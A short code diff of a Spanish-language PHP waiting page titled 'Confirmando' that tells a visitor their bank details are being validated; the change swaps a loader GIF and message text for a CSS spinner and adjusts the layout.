@@ -24,7 +24,7 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
 
-    <title>Confirmando</title>
+    <title>Confirmando...</title>
     
   <style>
 
@@ -39,12 +39,12 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
 <body style="">
 
 
-<center><div style="width: 90%;margin-top: 35%;">    
-  
-  <a style="font-size: 20px;">Espere un momento. <br> Estamos realizando unas validaciones con su banco</a><br>
-   
-  <img src="/assets/img/loader.gif" alt="" width="100%">
-  <a style="font-size: 20px;">No tardará más de un minuto.</a></center>
+<center>
+  <div style="width: 90%;margin-top: 45%;">    
+    <div class="spinner-container">
+      <div class="spinner"></div>
+  </div>
+</center>
 
 </div>
 
